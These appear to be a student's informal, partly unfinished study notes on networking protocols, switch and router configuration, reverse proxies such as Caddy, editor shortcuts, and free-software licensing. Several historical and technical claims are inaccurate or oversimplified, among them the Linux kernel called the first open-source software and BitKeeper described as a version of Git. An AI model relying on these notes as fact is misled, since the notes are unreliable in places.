  * But routers, yes. This also implies that a router can be a virtual machine, it can be a home computer... !
  * Buying a router means buying some device that's essentailly made to be a router. There's a good chance that not all home computers have the appropriate ports to be able to _prétendre à être un_ actual router.

### Layer 3 networking theory

- Routers route IP packets to their next hop according to their Routing Table.
- Routers and more generally any Layer-3 networking device abstract any Layer-2 (by definition of networking layers and the OSI models) : Adding a switch or not is basically equivalent to adding cables, changing cables, plugging a longer cables... The routers have no idea of this. They send Ethernet frames, encapsulating with a MAC destination in the header, and let switches to their job afterwards.
- Note that we say Ethernet **frames** and IP **packets**.
- Routers can use VRRP for redundancy, and many other 

### Layer 6 networking theory

- The standard protocol for cyphering data over the internet is TLS (Transport Layer Security). Its predecessor was SSL (Secure Sockets Layer). TLS is used to cypher HTTPS, mails, ...
- One can say that HTTPS is basically HTTP + TLS
- For that reason, when looking at the internet traffic going in and out of your computer (with Wireshark) when browsing the internet, you see TLS everywhere. That's because traffic is encrypted !

### Networking protocols 

#### Link layer protocols

[All link layer Protocols](https://en.wikipedia.org/wiki/Category:Link_protocols)

##### STP

- The Spanning-Tree Protocol is a Layer-2 protocol to allow switches to create a loop-free network topology. 
  * If a network has many physical connexions, its graph topology might contain loops. 
  * That is very problematic, for obvious reasons : you don't want packets Ethernet frames to loop forever, not only causing useless traffic but also making them never arrive at destination !
  * Other reasons why STP is necessary include unstable MAC address tables.
    + With loops, there could be frames with the same MAC address coming from different ports.    
    + Thing is, whenever a switch recieves a frame on a given port, it learns the MAC address on that frame.
    + So, with loops, switches might constantly change their MAC Address table.
    + This is highly problematic, as it results on time-dependent routing methid, that can quite obviously cause many issues.
    + Imagine setting up a network, testing it, having it to work, but having absolutely no certainty whatsoever that the situation is stable, i.e., having your network installation being able to break at any moment !
  * Also : Broadcast storms. Basically, when an ethernet frames is sent broadcast (`FF:FF:FF:FF:FF:FF`), switches forward it on all their ports (not necessarily all ports : on the right VLAN, at least). If there is a loop... you can quite easily see what this results in, and why it's called a Broadcast storm.
  * Another one : Duplicate frames. You can quite easily see how loops create duplicate frames - provided that you know that if a switch doesn't know a destination MAC address, it will send it on all ports.
  * Switches then run a Spanning-Tree Protocol instance, that allows to agree on a (common !) spanning tree for the network graph.
  * This is obviously necessary since the spanning tree obviously has to be common to all switches.
  * This is done by simply blocking some links, i.e. some ports. Some links are decided (commonly, thanks to STP) to be blocked, i.e., to never be used. This way, loops are broken.
- To start with it might be worth noting that there are several types of STP :
  * Original STP (802.1D
  * PVST+ (Per VLAN Spanning-Tree) : A Cisco improvement of STP adding a per VLAN feature
  * RSTP (802.1w)(Rapid Spanning-Tree Protocol) : An improved version of STP, that allows much faster convergence
  * Rapid PVST+ : A Cisco improvement of RSTP adding a per VLAN feature.
- In practice, it can take about 30s or 1min to converge to a solution. It can be even worse if you have a lot of switches ! (Whence the existence of RSTP)
- Spanning-Tree Protocol algorithm : 
  * 1st step : Elect a Root bridge.
    + The root bridge is one of the switches on the network.
    + It will play a special role in the algorithm.
- The Spanning-Tree protocol chooses a **Root bridge** : this one

##### MSTP

- Multiple Spanning-Tree Protocol is a generalization of the Spanning Tree Protocol, that can apply to several instances at once.
- It is used when severan VLANs share the same physical backbone (physical) network.
- Each instance of the MSTP has its root bridge (normal).

##### LACP

- Link Aggregation Control Protocol is a protocol that allows to aggregate several links into one to speed up the transmission.
- You could think that aggregating two (same speed) links would double the link speed, but in practice, the traffic due to protocol communication implies that you would typically get around 1.5x speed.

##### SNMP 

- Simple Network Management Protocol (SNMP) is an [Internet Standard](https://en.wikipedia.org/wiki/Internet_Standard) protocol (which means that it's standard over the Internet ; especially and typically, standardized by the IETF (Internet Engineering Task Force)(which looks like is the layer-3 equivalent to the IEEE, which semingly works more on layer 2)). 
  * It allows to get/manage **and edit** information about devices on IP networks.
  * Routers, switches, servers, workstations, printers, ... handle SNMP.

##### LLDP

- LLDP, Link Layer Discovery Protocol, a manufacturer-neutral link layer protocol used by network devices for showing their identity, capabilities, and neighbors on a local area network. 
  * It is based on IEEE 802 technology, principally wired Ethernet.
  * There are many proprietary equivalent protocols :
    + Cisco Discovery Protocol (CDP)
    + Foundry Discovery Protocol (FDP)
    + Nortel Discovery Protocol (NDP)
    + MikroTik Neighbor Discovery protocol (MNDP) 
    + Link Layer Topology Discovery (LLTP)(Microsoft)
  * In practice, devices are often, sometimes, but not always, compaptible with (some of) these.
- This protocols allows a device to retrieve information such as 
  * The topology of the network - actually, of the part of the network that's LLDP-enabled network
  * Information on the hosts of the network, such as :
    + System name and description
    + Port name(s) and description
    + VLAN name
    + IP management address
    + System capabilities (switching, routing, ...)
    + MAC/PHY information
    + Power of links (see Power over Ethernet, PoE)
    + Link aggregation

##### ARP 

##### Tunnels

##### PPP 

##### MAC

##### IPv4

##### IPv6

##### ICMP 

##### NDP

##### ECN

##### IGMP

##### IPsecmore...

#### Network layer Protocols

##### Internet Protocol (IP)

- The most ubiquitous protocol over the internet !
- The aren't many protocols other than IP $

##### Internet Control Message Protocol (ICMP)

- ICMP is used to debug IP.
- Essentially, its packets are used and sent whenever an IP packets encounters a problem.
  * For instance, if a packet has a TTL (Time To Live) equal to $t$, it will jump on at most $t$ hops before being discarded.
  * Each hop (router encountered) decreases the TTL of 1, until the last one, that discards it (TTL = 0)
  * The packet will then die without the reciever recieving it.
  * In such situation, equippments are then configured to send ICMP packets, to warn the sender that its packet has reached its TTL and was 
  * The `traceroute` packet and command leverages this to be able to trace the route of a packet !
  * Indeed, what `traceroute` does is that it sends the same packets with TTLs equal to 1,2,3,4,... until the packets reach destination.
  * Then, thanks to ICMP, `traceroute` knows on which router the $n$-th packet had TTL = 0 : 
  * i.e., what is the $n$-th hop on the route to destination !

#### Transport layer protocols

##### TCP 

- The TCP protocol establishes a connexion between two hosts.
  * To establish the connexion, the protocol uses a **three way handshake** :
  * SYN : The client attempts to establish a connexion with a remote host (server) by sending a first packet SYN (Synchronized). The SEQ number of this packet is **random**, let us denote it $A$.
  * SYN-ACK : The servers responds to the client with a packet SYN-ACK packet (Synchronize, Acknowledge). The ACK number is the sequence number of the previous packet incremented by 1 : $A+1$. The SEQ number of the SYN-ACK packet is a random number $B$.
  * ACK : Finally, the client sends an ACK packet to the server, that acknowledges the previous packet. Its SEQ number will be $A+1$ and its ACK number will be the $B+1$.
  * This protocol defines synchronized SEQ and ACK numbers for both the client and the server !
  * Note that according to this protocol there's only one possibility for SEQ and ACK numbers for both the client and the server !
  * From now on, all packets will be sent using SEQ and ACK numbers $A+n$ and $B+n$ for the reciever and $B+n$ and $A+n$ respectively.
- Then, the two hosts are connected. 
- TCP resends packets that aren't acknowledged, to make sure that the reciever recieves all the data.
- For instance, if you download a file, or request a web page, TCP ensures you your data will be whole.

##### UDP 

- UDP is the other ubiquitous protocol on layer 4.
  * UDP packets are not sent using connexion, but rather using the "Fire and Forget" principle.
  * i.e., UDP packets are sent, but never resent if they do not reach destination.
  * This is very useful, for Zoom of video games for instance !
  * If you roolback on a multiplayer video game, that's because some UDP packets were lost !
 
### VLANS

- VLANs are used in an effort to apply the hardware virtualization principle to layer-2 networking to create Software Defined Networking. Software Defined Networking is Computer Network's analog of Software-defined radio and Software-defined data centers.
- Without VLANs, a switch can only belong to one network. There is no possible notion of a switch beloning to several networks without VLANs. It then does its job and routes the frames (trames) to the right switches and endpoints normally. With VLANs, a switch is able to belong to sifferent networks at the same time. The way it works is as follows : 
- The endpoints are not aware of the existence of VLANs and of several networks. They talk to (send and recieve) untagged frames. It is the switches' problem to deal with VLANs and tagged frames. When a switch recieves an un tagged frame (that is : from an endpoint), it either :
  * transmits it _as is_ to the reciever endpoint, if the next hop is an endpoint (the intended recipient)
  * or, if the next hop is a switch : tags it with the corresponding VLAN (the port's VLAN), and send it to the switch. 
- In ACCESS A switch has several ports, and theses are _tagged_.
- In virtual networking, a câble requires a VLAN to exist

### QinQ

- VLANs were introduced with the standard [IEEE_802.1Q](https://fr.wikipedia.org/wiki/IEEE_802.1Q)
  * Note the presence of the Q letter : this is why its descendent is called QinQ.
  * The standard [IEEE 802.1ad](https://en.wikipedia.org/wiki/IEEE_802.1ad), known informally as **QinQ** (or stacked VLANs), allows multiple VLAN tags to be inserted into a single frame.
  * The frame is then double tagged. One tag contains the VLAN ID, the second the "sub-vlan" ID (so to speak).
- Using the norm IEEE_802.1ad implies to increase the maximum ethernet frame size of 4 bytes
- Or, to switch into Jumbo frame.
  * Jumbo frames are Ethernet frames with more than 1500 bytes of payload, the limit set by the IEEE (802.3) standard.
  * The payload limit for jumbo frames is variable, 9000 bytes is the most commonly used limit, but smaller and larger limits exist.
  * Many Gigabit Ethernet switches and Gigabit Ethernet NICs, and some Fast Ethernet switches and Fast Ethernet NICs can support jumbo frames.
  * Many vendors also adopted the size; however, jumbo frames are not part of the official IEEE (802.3) Ethernet standard.
- QinQ is often writted as Q-in-Q (useful to know when `CTRL+F`-ing or `F3`-ing (_bref_, searching) the keyword in a documentation)
### VXLANS

- VXLANs are a way to pass Layer-2 frames over IP.
  * The idea is to be able to send a Layer-2 (Ethernet, typically) frame using the IP protocol.
  * So, the ethernet frame becomes the payload of an IP packet : it is encapsulated into an IP packet and sent - hence, encapsulated into Ethernet again.
  * So, to sum it up, you have an Ethernet Header, followed by an IP header, maybe followed by a TCP header, that contains, as its payload, an Ethernet frame : i.e., the TCP payload starts with an Ethernet header (that might, again, contain an IP header, etc... or not)

### VPNs

### Firewalls, proxies, reverse-proxies

Note : By default, "port 3000" meands "TCP port 3000". Of the protocol is not specified, it is TCP by default.

### DHCP

DCHP is useful for configuring several IP addresses on a network, automatically and without conflict. 

### NAT

NATs exist because of the Bozos at Bell labs who decided there would be only 2^32 addresses.

### Other protocols

- Telnet (lol)
  * Telnet is an old, archaic ancestor of SSH
  * No one uses it anymore x)

### Control plane, Management plane, Data plane

- The Control Plane
  * It is where we decide what our networking will look like. 
  * How to we setup our networking ? Where do we put what ? 
  * How many switches ? Where do we put them ? 
  * Who's connected to who, and how (with which support) ?
  * It is basically the first step, deciding the "theory" of how do we set things up.
  * Typically, at Rezel, the big schemes on the networking infrastructure explain everything that's Control-plane related.
- The Management Plane
  * It is about actually setting up in practice.
  * Configuring switches, routers, with the corresponding interfaces
  * monitoring the connexions...
  * It can be seen as a "second step"
- The Data Plane
  * It is about actually transferring data.
  * It concerns everything that's related to actual data transferring.
  * It can be seen as a "third step".

## Computer Networking Practice

### Layer 1 networking pratice

- There isn't much to do except plugging the right cables at the right places. :)
- Except maybe being cautious : 
  * When working with opticAL fibers, beware of never approaching your eyes from stuff that can blind you.
  * Also, when working with optical fibers and transcievers, be gentle. Fibers are fragile and can break if you pinch them too hard. 
  * You likely won't break a transciever by merely pinching it, but letting it fall on the ground pretty much sign's its death warrant.
  * More generally never let layer-1 equippment, such as cables, "jarretières", optical fibers, transcievers on the ground. Dust is your worst ennemy.
  * Equippment often has small plastic or rubber plugs/caches/... to protect their ends or ports. Use them, and do not let these fall on the ground either !
  * This also applies to layer-2 or more equippment ports : SFP(-/+/28) ports on switches follow the same rules ; they have rubber plugs to protect them, that's not for decoration !

### Layer 2 networking practice

- This essentially boilds down to configuring switches.
- To connect to a switch, there are essentially two options
  * Either using a serial connexion
  * Or exposing an interface with an IP address on one of its VLANs, and then SSHing into it 
  * Or using a WebUI : the switch then has an IP address on one of its interfaces (on one of its VLANs, typically), and will expose a web server on (some port on) that IP address. Then, just go to the associated website (by typing the switch's IP address in the URL bar, specifying the port if needed - i.e. if it's neither 80 nor 443, could be that it's the case)
- Serial connexions
  * Switches usually have a serial port, to connect using a serial.
  * Serial communication usually goes through either RJ-45 ports, or, on older equippments (computers or switches), serial ports, which look like VGA ports, but with **2 pin rows** (often 9 pins, can be 25 pins sometimes), unlike VGA ports which contain 3 rows.
  * It can also, very usefully, be pased through USB ! For this, you will likely need a Serial USB driver. There exist many on the web, just lookup Serial-USB driver. 
- Then, the detail of the switch configuration, i.e. what commands should be typed, depend on the switch manufacturer : MikroTik, Cisco, Brocade, HP...
- A switch has a login and password for serial communication (probably not only serial communication, by the way).
  * When the switch is turned off, the session is closed.
  * But, if the switch is configures using serial communication, recall that the **serial protocol is only made to inject text**.
  * Hence, it **won't logout** when you unplug the serial port.

#### MiktoTik switches

- MikroTik switches run on RouterOS
- Physical-aspects related generalities
  * Quite obviously, the CONSOLE RJ45 port is for establishing a serial connection.
  * Then, the SFP(-/+/28/...) ports nature are specified under the ports.
- Console generalities
  * If you type the beginning of a command, and that there's no ambiguity as to the follow-up of your command, you can type a part of it and the console will understand what you meant.
  * For example, you can type `span ...` instead of `spanning-tree ...`, `p ...` instead of `print`...
  * There is a lot of autocompletion, in the sense of what's right above, but also right below.
  * When anywhere in the console, and even, anywhere right in the middle of a a command, you can press `TAB` for autocompletion. 
  * This will tell you all possible arguments to all commands, and even all possible values to command arguments ! 
  * (i.e. : `add ` + `TAB` will tell you that you can type `bridge` as parameter to `add`, and then, `add bridge=` + `TAB` will tell you all the possible values to the argument `bridge` : that is, all possible bridges, hence, all existing bridges).
- The notion of context
  * When in the console, there is a notion of "context", which is kind of like a folders, but not really.
  * There is a an arborescence, kind of like the Linux file system arborescence, but the folders do not "contain files".
  * Actually, a entering a "subfolder" of a "folder" means going more specific in the configuration.  * When anywhere in the console (in any context), you can type `/path/to/something/command` to execute the command `command` in the context `path/to/something`. 
  * In particular, for instance, typing `/command` executes command `command` at the "root" `/`. 
  * So, typing `/command` and command at `/` is the same thing.
  * If no path is specified (which is equivalent to : if the typed prompt does not start with `/`), the command will be executed in the current context.
  * Use `..` to go back one step in the arborescence
- To see all the configuration that's been set up on the switch, to can type /export.
  * More generally, `export` shows the list of commands that have been executed in the current context, and recursively in all subcontexts.
  * It allows to export a configuration ! (or part of a configuration)

#### Cisco switches

- Cisco switches run on Cisco IOS
- Similarities with MikroTik switches :
  * It is possible to type the beginning of keyword, the console will guess what you meant if there's no ambiguity.
  * Using `TAB` will complete a partial command (without ambiguity) into a whole one.
  * `?` will list all possible commands (in current configuration mode)
  * `command ?` will list all possible arguments to command `command`
  * `command arg=?` will list all possible values to argument `arg` for command `command`
- Commande modes :
  * Prompt `Switch>`
    + "User EXEC" mode.
    + The default mode when accessing the switch command line.
    + Exit with `logout` or `quit`
  * Prompt `Device#`
    + "Privileged EXEC" mode (≃`root`)
    + Enter with `enable`
    + Exit with `disable`
    + Is password protected, or should be...
  * Prompt `Device(config)#`
    + Global configuration mode
    + Enter with `configure` in Priviledged mode
    + Exit with `exit`, or `end`, or `CTRL+Z`
    + Use this mode to configure parameters that apply to the **entire switch**.
  * Prompt `Device(config-vlan)#`
    + VLAN configuration mode
    + Enter with `vlan <vlan-id>` in Global configuration mode
    + Exit to global configuration mode with `exit`
    + Exit to Privileged mode with `end` or `CTRL+Z`
  * Prompt `Device(config-if)#`
    + Interface configuration mode
    + Enter with `interface <interface>` in Global configuration mode
  * Prompt `Device(config-line)#`
    + This is for connecting to the switch via Telnet or SSH
    + Enter with `line vty <x> <y>`, specifying a line (`line console` exists)
    + Exit to global configuration mode with `exit`
    + Exit to Privileged mode with `end` or `CTRL+Z`
- The Cisco documentation distinguishes the "Command Reference" and "Command Reference Guide" : (Excerpt from "Consolidated Platform Command Reference, Cisco IOS Release 15.2" : "For more detailed information on the command modes, see the command reference guide for this release")

### Layer 3 networking practice

- This essentially boils down to configuring routers.
- Recall that a router runs on an OS that's most often (always ?) UNIX-based. 
- `ip route add [mask : IP range / or : "default" for setting default gateway] via [nexthop]` to add a line to the device's routing table. 
- Each interface always has a MAC address one per interface.
- Some interfaces may have IP addresses, but not necessarily all of them.
  * If an interface has an IP address, it means that a packet with it as destination IP address will be treated by the OS as such. Interfaces without IP addresses act for Layer-2 networking.
- Never use DHCP for routers !
- `ip link set dev [interace] up` to up an interface.
  * Recall that an interface is either up or down.
  * When an interface is "up", it is equivalent to when physical ports have an electrical connection : i.e., having a little light turned on to indicate that an electrical connexion is set established.

#### Physical routers

#### Virtual routers

- "Up-ing" an interface is the virtual equivalent to plug a cable onto a router. It's like turning on the electrical power (turning on, basically) the interface. When an interface is down, it is as it was unplugged. When it's up, it's plugged.

### Netbox

Netbox is a self-hosted service that allows to manage routers (Devices, connexions, IPAM...)

An IPAM, IP Address Manager, allows to manage IP addresses manually, kind of like an EXCEL file, but with some additional (specific tp IP address management) features.

### VPNs 

#### OpenVPN

OpenVPN is what Telecom Paris uses for its VPN.

#### Wireguard

Wireguard is what Clément uses for his private use of VPN. :O

### Reverse-proxies

#### Nginx

- GitHub stars : 25k
- Nginx is the world's most popular Web Server. It provides load balancing, reverse proxy, ...
- Note : nginx does not have sufficient permissions to deal with files (in particular, to serve, redirect to..) stored under `/root/`...!
- In particular; do not put your web-server there !

#### Caddy

- GitHub stars : 57.9k
- Caddy is very cool ! :)
- It allows easy configuration, automatic HTTPS, without any external dependencies.
- An amazing fun fact : A paper written by experts describing Let's encrypt, "Let’s Encrypt: An Automated Certificate Authority to Encrypt the Entire Web", explicitely says : "Servers running Caddy exhibit nearly ubiquitous HTTPS deployment and use modern TLS configurations. ... We hope to see other popular server software follow Caddy's lead." !
- Caddy is one of those packages that you don't install directly via a package manager.
  * The [documentation](https://caddyserver.com/docs/install) says to run 
  * ```bash 
    sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https curl
    curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
    curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list
    sudo apt update
    sudo apt install caddy
    ```
  * This could be updated so re-check directly
- Once installed it should be run as a service : `systemctl restart caddy`. 
- The configuration file is then in `/etc/caddy/Caddyfile`
- An example of Caddy file configuration : 
```
{
  debug
}

:8000 {
    handle_path /first_folder/* {
        root * /path/to/folder
        file_server
    }

    handle_path /second_folder/* {
        root * /path/to/folder2
        file_server browse
    }

    log {
        output stderr
        level debug
        format console
    }

    handle {
        reverse_proxy localhost:8001
    }
}
```
- The code snippet above does the following : 
  * When recieving requests on port 8000, 
  * If the request is on folder `/first_folder/` (i.e., the user requested `<ip address or domain name>/first_folder`), then redirect to `/path/to/folder`.
  * If none of the above paths are met, then the request will be given away to itself on port 8001 (`localhost` : loopback)
  * By adding `file_server`, if the request is `.../first_folder/file.pdf`, caddy will serve the file.
  * **Note :** This does not work if caddy does not have permissions in the folder. For instance, it doesn't work in any subfolders of `/root/` !
  * By adding `file_server browse`, caddy will display an interface allowing to browse files and folder in that folder.
  * Note : `root * ...` can be simplified as `root ...`
  * `log { ... }` and `{ debug }` do what we expect from them, that is, being verbose about problems and errors. (This will be seen in `systemctl status <service>` if caddy is run as a service)
- Note : caddy does not have sufficient permissions to deal with files (in particular, to serve, redirect to..) stored under `/root/`...!
- In particular; do not put your web-server there !

#### Systemctl

- Systemctl allows to run processes as _services_ : i.e., 
- Services could typically include : 
  * Reverse-proxies such as nginx, caddy, traefik... 
  * Proxies
  * Web servers...
- `systemctl restart service` to restart a service
- `systemctl enable service` to have a service enabled.
- When _enabled_, a service will be started at boot of your computer. 
- i.e., services remain active after system restart (after rebooting).
- `systemctl status service` shows the status of a service. 
  * In particular, it shows the command that's ran when (re)starting the service : `caddy ... ...`, or `nginx ... ...`...
- You can set your own services (with corresponding custom configuration files)
- When in production, things should be always deployed as services. (in particular, web servers should not be deployed using mere terminal multiplexers)(I mean, both work, but ya know.)

#### Traefik

GitHub stars : 51k
Traefik is kinda like Caddy : it is configured with configuration files. 
The syntax is obiously different. It uses YaML (``.yml``) (configuration) files. It's kinda less simple than Caddy (some things require 10 lines in Traefik vs. a pair in Caddy).

#### Haproxy

GitHub stars : 4.9k
Haproxy is what Antonin uses at Rezel for the hosting-gateway reverse-proxy. 
It is not as easy to use as Caddy...

## Other

### VSCode

- `CTRL+K CTRL+O` to expand all.
- (...) to collapse all.
- `CTRL+K CTRL+S` to open (and edit) keyboard shortcuts !
- `CTRL+*` to split up the screen vertically.
- When in "Find and replace mode", pressing enter in the first field searches for next occurence of the pattern, while pressing enter in the second _replaces current occurence_ and finds the next one. ! :)
- When in VSCode, `CTRL+SHIFT+C` opens in the (VSCode) working directory. There is likely an equivalent way for opening a terminal on Linux.

### ffmpeg

- `choco install ffmpeg` to install it on any device (that has chocolatey installed)
- Conversion : `ffmpeg -i input.ext1 output.ext2`

### Chrome  
- `CTRL+SHIFT+B` pour afficher/cacher la barre des favoris
- `view-source:https://...` ou `CTRL+U` pour afficher la code source d'une page
- YouTube : Press the `o` key to change the brightness of the text on subtitles. Particularly useful as the text often tends to become darker and grey<sup>USA</sup>/gray<sup>GB</sup>.
- You can set particular website query shortcuts in `chrome://settings/searchEngines` : add the URL with `%s` where the query should be inserted and the shortcut to type in the search bar.

### Markdown
- `<ins> ... </ins>` to underline text.
- `<sup> ... </sup>` to superscript (écrire en exposant)
- `<sub> ... </sub>` to subscript (écrire en indice)
- It is possible to make hypertext links to different parts of the same Markdown document using :`[Hyperlink name](#name-of-the-title-in-lowercase-and-with-dashes-instead-of-spaces)
- Unfortunately, if several titles have the same name, any hyperlink will link to the first occurence of that name. Even if they aren't at the same "stage", or "scope" (i.e., even if they don't have the same number of `#` (sharps))
- You can write inline code with backticks : `. 
- Triple backticks allow to write code on several lines. Adding a keyword right after the opening triple backticks allow to specify the language used (Go, Python, JavaScript, ..., or even git diff !) for the preview to color the code appropriately.
- Note : It is possible to use triple backticks code (code that expands on several lines) _within_ bullet point lists, but **beware** : for these to be correctly displayed (when the Markdown will be rendered), the following formatting must be applied :
  * ```md
    - (Text)(optional)
      * (Text)(optional)
      * [Triple backtick]
        code
        [Triple backtick]
      * (Text)(optional)
    ```
  * i.e. : 
    + The triple backticks must imperatively be indented accordingly, at the same level as the bullet point.
    + The code too. _Bref_, everything must be indented at the same level as the bullet point.
- Amazing : By a miracle, a hyperlink like `[text](#aaabbb)` _will_ link a title containing special caracters and backticks (example : ` ### `/etc/passwd` `) !
- Is is possible to make tables :
```
| Left Aligned | Center Aligned | Right Aligned |
|:------------ |:--------------:| -------------:|
| Row 1 Col 1  | Row 1 Col 2    | Row 1 Col 3   |
| Row 2 Col 1  | Row 2 Col 2    | Row 2 Col 3   |
```
| Left Aligned | Center Aligned | Right Aligned |
|:------------ |:--------------:| -------------:|
| Row 1 Col 1  | Row 1 Col 2    | Row 1 Col 3   |
| Row 2 Col 1  | Row 2 Col 2    | Row 2 Col 3   |

### The FTP Protocol

It is possible to transfer files between computers over the same network by using FTP URLs in a web browser like Google Chrome. However, web browsers typically only support downloading files from an FTP server, not uploading. You need an FTP client (like FileZilla or WinSCP) if you want to upload files as well.

To send files through the FTP Protocol :
- Set Up the FTP Server : You need to set up an FTP server on the computer that sends the file.
- After setting up the FTP server, get the IP Address of the FTP Server : find the local IP address of the computer that is running the FTP server.
- Access Files Using Chrome (or any other browser) : In the URL bar, you can enter an FTP URL in the following format: ``ftp://username:password@ip-address:port``
  * ``username`` : The username you set up on the FTP server.
  * ``password`` : The password associated with that username.
  * ``ip-address`` : The local IP address of the FTP server.
  * ``port`` : The port number of the FTP server : default for FTP is 21.
  * If authentication is not required, you can omit the username and password.
- Once you enter the FTP URL, you should be able to browse the directories on the FTP server. Clicking on a file will start a download.

### Vivenot.dev

- ``configuration.nix`` is located in ``/etc/nixos/profiles/homelab``

### OSInt

- Open-Source Intelligence : Its the science of aquiring non-trivial information using public information
- Methods and tools :
  * aperisolve.com, for steganography, is useful 
  * MrHolmes is a open-source tool : https://github.com/Lucksi/Mr.Holmes

### OpenGL

### Cairo

### Free software

- **Free software** refers to any type of software that's distributed under a license that allows the software recipients to use it, read the source code, edit it, and redistribute it, whether it be intact or edited.
  * The opposite of Free Software is **proprietary software**.
  * Chrome, Windows, Discord, the Microsoft Office suite (Word, Excel...), the Adobe suite (Photoshop, Premiere, After Effects...) are proprietary softwares. 
  * Chromium, Firefox, Git, Gimp, Inkscape, everything that's on GitHub or Gitlab, and litterally everything that's Linux-related, are free softwares. 
  * Free software guarantees freedoms to the user (as opposed to proprietary softwares that restrain the use, access and edition to source code and (re)distribution)
  * Free software is also another mode of (software) development, collaborative and open. This is what we often refet to with the word "open-source". 
- [GitHub Collections](https://github.com/collections) and [Awesome Lists](https://github.com/sindresorhus/awesome)
- The name "Free software" was popularized by Richard Stallman and the Free Software Foundation (1985).
  * It emphasize **freedom** : 
    + Freedom to use a given (source) code anywhere, for any use ;
    + Freedom to read and write the source code of a given software ;
    + Freedom to redistribute copies of a software ;
    + Freedom to redistribute edited copies of a software.
- The name "Open source" was populazired by Eric Raymond and the Open Source Initiative (1998).
  * It emphasizes sharing of source code and/for open collaboration as a development mode.
- Many people confuse both terms, but in practice, most free software are open-source, and conversely. 
- Miscellanea on miscellaneous free (and not free) softwares : 
  * Unix is not a free software
  * But the BSD (Berkeley Software Distribution : FreeBSD, OpenBSD, NetBSD), and GNU / Linux, their spiritual descendants, are.
  * The GNU Project, initiated in 1983 by Richard Stallman to create a completely free Unix, is free.
  * It is a collection of projects (GNU Emacs, glibc, GDB, GNU Bash, GNU Core Utilities (cat, ls, rm, ...), GIMP (yes, you read that right)). Richard Stallman also created the Free Software Foundation in 1985.
  * The X Windows System (see x.org) is also free. 
  * The Linux kernel is the first open-source software, i.e. collaboratively developped.
  * Debian is entirely community-based, almost entirely free
  * RedHat is simultaneously a company and a Linux distribution.
    + It distributes the Red Hat distribution, and sells its maintenance
    + Fedora is the community version of Red Hat.
    + RedHat was sold to IBM for 34G$ in 2019.
  * Apache (HTTP Server) is also very widely used.
  * LibreOffice is a community fork of OpenOffice, maintained by the The Document Foundation.
  * Android is Linux-based, and free too.
  * SourceForge is aimed ad providing Git-like features. It lost credibility after an Adware controversy. 
    + An Adware is a software that's an ad. Typically, it would be a software that's installed on a device within another software setup. I.e. : you install some software, and the setup proposes to install some (other, unrelated) software , this (other, unrelated) software paying the original software for it to display their software in their setup. 
    + In July 2013, SourceForge announced that it would provide project owners an optional feature called _DevShare_, which places adwares into the binary installers and gives the project part of the ad revenue.
    + Opinions of this new feature varied; some complained about users not being as aware of what they are getting or being able to trust the downloaded content, whereas others saw it as a reasonably harmless option that keeps individual projects and users in control.
    + In November 2013, GIMP removed its download from SourceForge, citing misleading download buttons that potentially confuse customers as well as SourceForge's own Windows installer, which bundles potentially unwanted programs with GIMP. 
    + In a statement, GIMP called SourceForge a "once useful and trustworthy place to develop and host FLOSS applications" that now faces "a problem with the ads they allow on their sites".
    + That pretty much describes the decline of SourceForge in a nutshell.
  * Git was created by Linux Torvalds as a free alternative to BitKeeper (a proprietary version... of Git) for the development of the Linux Kernel.
- Intellectual property
  * Free software **licenses** determine what you can do with them.
  * **Copy rights** protect original creations, it empasizes expression, not ideas.
    + In France, it applies automatically.
    + The "moral rights" correspond to paternity, 
    + The "patrimonial rights" correspond to a right of exploitation monopole for a determined duration such as 70 years after the death of the author. They can be ceded.
    + Something reaches **public domain** if it is not protected by patrimonial rights
  * **Patents** offer a monopole for exploitation of industrial inventions.
    + They require the idea to be new, and non-trivial.
    + They are generally applicable for a determined length, such as 20 years.
  * **Companies**
    + They indicate the origin of a product.
- Licenses 
  * A license is a contract that allows an owner (of a software for instance)(but not necessarily)(but typically), who detain copyrights (or a patent), to enable rights to the recipients of the license.
  * No license means no rights.
  * When a software is sold, the buyer buys... a license ! That allows him to use the software, often (but not always) in a given context, for a specific use. 
  * In the case of Free software, licenses enable rights, more or less permissively, to all recipients of the software.
  * Note : **Licence** [FR] ; vs. **License** [EN].
  * The website [Choose A License](https://choosealicense.com/appendix/) is very useful ! 
  * It synthesizes all rights and restrictions among all (the most popular) licenses. :D
  * Copyleft means allowing to redistribute edited copies of a software, but only **under the same license**.
```
MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
```
- License examples 
  * Very permissive
    + The MIT License (see text above)
    + BSD3
    + BSD2
    + Apache 2.0
  * Weak copyleft
    + MPL 2.0
    + GNU LGPL 3.0
    + LGPL 2.1
  * Strong copyleft
    + GNU GPL 2.0
    + GPL 3.0
    + GNU AGPL 3.0
- (two) Licenses are compaptible if its possible to to have a software that **derives from both**.
  * GNU GPL 2.0 imposes (strong) copyleft
  * CDDL too.
- Choosing a license
  * Rule n°1 : Do not forget tu put al icense onto your project !
    + Without a license, copyright and patrimonial rights apply, and users do not have any right.
  * Rule n°2 : Do not invent you own license !
    + If too many licenses show up, there are juridical risks (licenses are less understood, less tested)
    + Risk of incompaptibility between licenses.
    + Better choose a popular license !
  * Rule n°3 : Choose a license that you understand !
    + Some licenses are complex.
    + For instance, the GNU LGPL License offer additional rights, under technical conditions that do not suit all programming languages.
    + It is hard to change the license of a program later, after numerous external contributions.
- Recall that Creative Commons licenses exist. Only CC-BY and CC-BY-SA are free.
  * In a nutshell
  * BY : Cite the author
